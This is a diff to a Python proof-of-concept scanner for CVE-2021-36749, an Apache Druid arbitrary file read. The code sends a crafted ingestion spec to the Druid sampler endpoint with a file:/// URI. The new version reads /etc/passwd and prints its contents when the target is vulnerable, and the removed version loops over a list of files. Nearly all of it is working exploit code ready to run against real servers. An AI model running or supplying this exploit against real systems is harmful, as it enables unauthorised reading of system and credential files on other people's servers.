@@ -7,7 +7,7 @@ import json
 
 import requests
 
-import main
+from HScan import main
 
 # In the Druid ingestion system, the InputSource is used for reading data from a certain data source. However,
 # the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local
@@ -56,40 +56,17 @@ lists = [
 ]
 
 
-def Apache_Druid_any_path(inurl, timeout=6,code='gbk'):
-    poc_name = 'CVE-2021-36749'
-    re = ''
-    if inurl[-1] == '/':
-        inurl = inurl[0:len(inurl) - 1]
-    for list in lists:
-        url = inurl + "/druid/indexer/v1/sampler?for=connect"
-        headerss = {"Accept": "application/json, text/plain, */*",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-                    "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888",
-                    "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate",
-                    "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-        post_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index",
-                                                                             "firehose": {"type": "http", "uris": [
-                                                                                 " file:///" + list]}},
-                                               "dataSchema": {"dataSource": "sample", "parser": {"type": "string",
-                                                                                                 "parseSpec": {
-                                                                                                     "format": "regex",
-                                                                                                     "pattern": "(.*)",
-                                                                                                     "columns": ["a"],
-                                                                                                     "dimensionsSpec": {},
-                                                                                                     "timestampSpec": {
-                                                                                                         "column": "no_ such_ column",
-                                                                                                         "missingValue": "2010-01-01T00:00:00Z"}}}}},
-                     "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
-        r = requests.post(url, headers=headerss, json=post_data, timeout=timeout, verify=False)
-        r.encoding = code
-        re = re + r.text
-        if not 'Error 404 Not Found' in re and not 'Not Found' in re:
-            if not '404' in re:
-                main.print_green(f'{poc_name} ====> 存在漏洞 ====> {url}')
-                return
-            else:
-                re = re + '失败'
-        else:
-            re = re + '失败'
-    return re
+
+def Apache_Druid_any_path(data, timeout=6,code='gbk'):
+    url = data + '/druid/indexer/v1/sampler?for=connect'
+    json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
+    try:
+        response = requests.post(url,  json=json_data, timeout=timeout, verify=False, allow_redirects=False)
+        response_text = response.text
+        if 'root:x:0' in response_text:
+            main.print_green(f'CVE-2021-36749 ====> 存在漏洞 ====> {url}\n内容为:{response_text}')
+    except Exception:
+        pass
+
+if __name__ == '__main__':
+    Apache_Druid_any_path('')
